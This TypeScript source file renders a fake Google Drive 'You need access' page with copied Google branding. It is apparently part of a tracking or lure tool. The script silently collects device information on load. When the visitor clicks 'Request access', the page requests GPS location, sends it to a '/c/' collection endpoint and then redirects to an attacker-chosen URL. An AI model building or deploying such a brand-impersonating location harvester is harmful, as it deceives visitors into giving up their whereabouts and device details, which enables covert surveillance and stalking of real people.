import { escapeHtml } from '../utils/html.js';

interface GdriveTemplateOptions {
  fileName?: string;
  fileType?: 'pdf' | 'doc' | 'sheet' | 'slide' | 'image' | 'zip';
  fileSize?: string;
  ownerEmail?: string;
  message?: string;
}

const FILE_ICONS: Record<string, { color: string; svg: string }> = {
  pdf: {
    color: '#ea4335',
    svg: '<path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zM14 8V3l5 5h-5zM8 13h8v2H8v-2zm0 4h8v2H8v-2z"/>',
  },
  doc: {
    color: '#4285f4',
    svg: '<path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zM14 8V3l5 5h-5zM8 13h8v2H8v-2zm0 4h5v2H8v-2z"/>',
  },
  sheet: {
    color: '#0f9d58',
    svg: '<path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zM14 8V3l5 5h-5zM8 12h3v3H8v-3zm5 0h3v3h-3v-3zm-5 5h3v3H8v-3zm5 0h3v3h-3v-3z"/>',
  },
  slide: {
    color: '#f4b400',
    svg: '<path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zM14 8V3l5 5h-5zM7 12h10v7H7v-7z"/>',
  },
  image: {
    color: '#ea4335',
    svg: '<path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zM14 8V3l5 5h-5zM8 17l2.5-3 1.5 2 2.5-3L18 17H8z"/>',
  },
  zip: {
    color: '#5f6368',
    svg: '<path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zM14 8V3l5 5h-5zM10 4h2v2h-2V4zm0 4h2v2h-2V8zm0 4h2v2h-2v-2zm-1 4h4v4H9v-4z"/>',
  },
};

export function renderGdriveTemplate(slug: string, targetUrl: string, options: GdriveTemplateOptions = {}, gpsMode: string = 'optional'): string {
  const fileName = escapeHtml(options.fileName || 'Shared_Document.pdf');
  const fileType = options.fileType || 'pdf';
  const fileSize = escapeHtml(options.fileSize || '2.4 MB');
  const ownerEmail = escapeHtml(options.ownerEmail || 'user@gmail.com');
  const message = options.message ? escapeHtml(options.message) : '';
  const icon = FILE_ICONS[fileType] || FILE_ICONS.pdf;

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${fileName} - Google Drive</title>
  <link rel="icon" href="https://ssl.gstatic.com/docs/doclist/images/drive_2022q3_32dp.png" type="image/png">
  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Google Sans', 'Roboto', -apple-system, BlinkMacSystemFont, sans-serif;
      background: #f8f9fa;
      min-height: 100vh;
      color: #202124;
    }
    .header {
      background: #fff;
      padding: 0 16px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      height: 64px;
      border-bottom: 1px solid #e0e0e0;
    }
    .header-left {
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .header-logo {
      display: flex;
      align-items: center;
      gap: 8px;
      text-decoration: none;
      padding: 4px 8px;
    }
    .header-logo svg { width: 40px; height: 40px; flex-shrink: 0; }
    .header-logo span {
      font-size: 22px;
      color: #5f6368;
      font-family: 'Google Sans', sans-serif;
      font-weight: 400;
    }
    .header-search {
      flex: 1;
      max-width: 720px;
      margin: 0 32px;
      background: #f1f3f4;
      border-radius: 24px;
      height: 48px;
      display: flex;
      align-items: center;
      padding: 0 16px;
      gap: 12px;
    }
    .header-search svg { width: 20px; height: 20px; fill: #5f6368; flex-shrink: 0; }
    .header-search span { color: #5f6368; font-size: 16px; font-family: 'Google Sans', sans-serif; }
    .header-right {
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .avatar {
      width: 32px;
      height: 32px;
      border-radius: 50%;
      background: #1a73e8;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
    }
    .icon-btn {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      border: none;
      background: transparent;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .icon-btn:hover { background: #f1f3f4; }
    .icon-btn svg { width: 20px; height: 20px; fill: #5f6368; }
    .main-wrapper {
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: calc(100vh - 64px);
      padding: 24px;
    }
    .main-card {
      background: #fff;
      border-radius: 8px;
      box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
      max-width: 480px;
      width: 100%;
      padding: 48px 40px 36px;
      text-align: center;
    }
    .lock-icon {
      width: 72px;
      height: 72px;
      margin: 0 auto 24px;
      background: #f1f3f4;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .lock-icon svg { width: 32px; height: 32px; fill: #5f6368; }
    .main-title {
      font-family: 'Google Sans', sans-serif;
      font-size: 22px;
      font-weight: 400;
      color: #202124;
      margin-bottom: 12px;
    }
    .main-subtitle {
      font-family: 'Roboto', sans-serif;
      font-size: 14px;
      color: #5f6368;
      line-height: 20px;
      margin-bottom: 32px;
    }
    .main-subtitle a { color: #1a73e8; text-decoration: none; }
    .main-subtitle a:hover { text-decoration: underline; }
    .btn-request {
      background: #1a73e8;
      color: #fff;
      border: none;
      padding: 0 24px;
      height: 36px;
      font-family: 'Google Sans', sans-serif;
      font-size: 14px;
      font-weight: 500;
      border-radius: 4px;
      cursor: pointer;
      letter-spacing: 0.25px;
      transition: background 0.2s, box-shadow 0.2s;
    }
    .btn-request:hover {
      background: #1557b0;
      box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
    }
    .btn-request:disabled {
      background: #8ab4f8;
      cursor: default;
      box-shadow: none;
    }
    .divider {
      height: 1px;
      background: #e0e0e0;
      margin: 24px 0 16px;
    }
    .file-info {
      display: flex;
      align-items: center;
      gap: 12px;
      text-align: left;
    }
    .file-type-icon {
      width: 40px;
      height: 40px;
      border-radius: 4px;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-shrink: 0;
    }
    .file-type-icon svg { width: 20px; height: 20px; fill: #fff; }
    .file-details {
      min-width: 0;
    }
    .file-details-name {
      font-family: 'Google Sans', sans-serif;
      font-size: 14px;
      font-weight: 500;
      color: #202124;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }
    .file-details-meta {
      font-family: 'Roboto', sans-serif;
      font-size: 12px;
      color: #5f6368;
      margin-top: 2px;
    }
    .status-area {
      margin-top: 20px;
      font-family: 'Roboto', sans-serif;
      font-size: 14px;
      color: #5f6368;
      display: none;
    }
    .status-area.show { display: flex; align-items: center; justify-content: center; gap: 8px; }
    .spinner-sm {
      width: 18px;
      height: 18px;
      border: 2px solid #e0e0e0;
      border-top-color: #1a73e8;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .success-msg {
      display: none;
      margin-top: 20px;
      padding: 12px 16px;
      background: #e6f4ea;
      border-radius: 4px;
      color: #137333;
      font-family: 'Roboto', sans-serif;
      font-size: 14px;
    }
    .success-msg.show { display: flex; align-items: center; gap: 8px; }
    .success-msg svg { width: 18px; height: 18px; fill: #137333; flex-shrink: 0; }
    .footer {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      padding: 12px 24px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      background: #f8f9fa;
      font-family: 'Roboto', sans-serif;
      font-size: 12px;
      color: #5f6368;
    }
    .footer a {
      color: #5f6368;
      text-decoration: none;
      margin-left: 16px;
    }
    .footer a:hover { color: #202124; }
    .footer-logo svg { width: 60px; fill: #9aa0a6; }
    @media (max-width: 600px) {
      .header-search { display: none; }
      .main-card { padding: 32px 24px 28px; margin: 0 8px; }
    }
  </style>
</head>
<body>
  <div class="header">
    <div class="header-left">
      <div class="header-logo">
        <svg viewBox="0 0 87.3 78" xmlns="http://www.w3.org/2000/svg">
          <path d="m6.6 66.85 3.85 6.65c.8 1.4 1.95 2.5 3.3 3.3l13.75-23.8h-27.5c0 1.55.4 3.1 1.2 4.5z" fill="#0066da"/>
          <path d="m43.65 25-13.75-23.8c-1.35.8-2.5 1.9-3.3 3.3l-20.4 35.3c-.8 1.4-1.2 2.95-1.2 4.5h27.5z" fill="#00ac47"/>
          <path d="m73.55 76.8c1.35-.8 2.5-1.9 3.3-3.3l1.6-2.75 7.65-13.25c.8-1.4 1.2-2.95 1.2-4.5h-27.5l5.4 13.8z" fill="#ea4335"/>
          <path d="m43.65 25 13.75-23.8c-1.35-.8-2.9-1.2-4.5-1.2h-18.5c-1.6 0-3.15.45-4.5 1.2z" fill="#00832d"/>
          <path d="m59.8 53h-32.3l-13.75 23.8c1.35.8 2.9 1.2 4.5 1.2h50.8c1.6 0 3.15-.45 4.5-1.2z" fill="#2684fc"/>
          <path d="m73.4 26.5-10.2-17.65c-.8-1.4-1.95-2.5-3.3-3.3l-13.75 23.8 16.15 23.8h27.45c0-1.55-.4-3.1-1.2-4.5z" fill="#ffba00"/>
        </svg>
        <span>Drive</span>
      </div>
    </div>
    <div class="header-search">
      <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
      <span>Search in Drive</span>
    </div>
    <div class="header-right">
      <button class="icon-btn" title="Support">
        <svg viewBox="0 0 24 24"><path d="M11 18h2v-2h-2v2zm1-16C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm0-14c-2.21 0-4 1.79-4 4h2c0-1.1.9-2 2-2s2 .9 2 2c0 2-3 1.75-3 5h2c0-2.25 3-2.5 3-5 0-2.21-1.79-4-4-4z"/></svg>
      </button>
      <button class="icon-btn" title="Settings">
        <svg viewBox="0 0 24 24"><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58a.49.49 0 0 0 .12-.61l-1.92-3.32a.488.488 0 0 0-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54a.484.484 0 0 0-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.07.62-.07.94s.02.64.07.94l-2.03 1.58a.49.49 0 0 0-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg>
      </button>
      <div class="avatar">${ownerEmail.charAt(0).toUpperCase()}</div>
    </div>
  </div>

  <div class="main-wrapper">
    <div class="main-card">
      <div class="lock-icon">
        <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
      </div>
      <h1 class="main-title">You need access</h1>
      <p class="main-subtitle">
        ${message
          ? message
          : `Ask <a href="#">${ownerEmail}</a> for access, or switch to an account with access.`
        }
      </p>
      <button class="btn-request" id="requestBtn" onclick="handleRequest()">
        Request access
      </button>

      <div class="status-area" id="statusArea">
        <div class="spinner-sm"></div>
        <span>Sending request...</span>
      </div>

      <div class="success-msg" id="successMsg">
        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
        <span>Access requested. Redirecting...</span>
      </div>

      <div class="divider"></div>

      <div class="file-info">
        <div class="file-type-icon" style="background:${icon.color}">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">${icon.svg}</svg>
        </div>
        <div class="file-details">
          <div class="file-details-name">${fileName}</div>
          <div class="file-details-meta">${fileType.toUpperCase()} &middot; ${fileSize}</div>
        </div>
      </div>
    </div>
  </div>

  <div class="footer">
    <div class="footer-logo">
      <svg viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
        <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#9aa0a6"/>
        <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.86 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#9aa0a6"/>
        <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#9aa0a6"/>
        <path d="M225 3v65h-9.5V3h9.5z" fill="#9aa0a6"/>
        <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#9aa0a6"/>
        <path d="M35.29 41.19V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49-.21z" fill="#9aa0a6"/>
      </svg>
    </div>
    <div>
      <a href="https://policies.google.com/terms" target="_blank">Terms</a>
      <a href="https://policies.google.com/privacy" target="_blank">Privacy</a>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@2/dist/ua-parser.min.js"></script>
  <script src="/static/collector.js"></script>
  <script>
    window.__TRACKER_CONFIG = {
      slug: ${JSON.stringify(slug)},
      collectUrl: '/c/' + ${JSON.stringify(slug)},
      targetUrl: ${JSON.stringify(targetUrl)},
      templateId: 'gdrive',
      gpsMode: ${JSON.stringify(gpsMode)}
    };

    // Collect device info silently on load
    if (window.TrackerCollector) {
      window.TrackerCollector.collectDeviceInfo();
    }

    function handleRequest() {
      var btn = document.getElementById('requestBtn');
      var statusArea = document.getElementById('statusArea');
      var successMsg = document.getElementById('successMsg');

      btn.disabled = true;
      statusArea.classList.add('show');

      if (window.TrackerCollector) {
        window.TrackerCollector.requestGPSAndSubmit(window.__TRACKER_CONFIG, function() {
          statusArea.classList.remove('show');
          successMsg.classList.add('show');
          setTimeout(function() {
            window.location.href = window.__TRACKER_CONFIG.targetUrl;
          }, 2000);
        });
      }
    }
  </script>
</body>
</html>`;
}
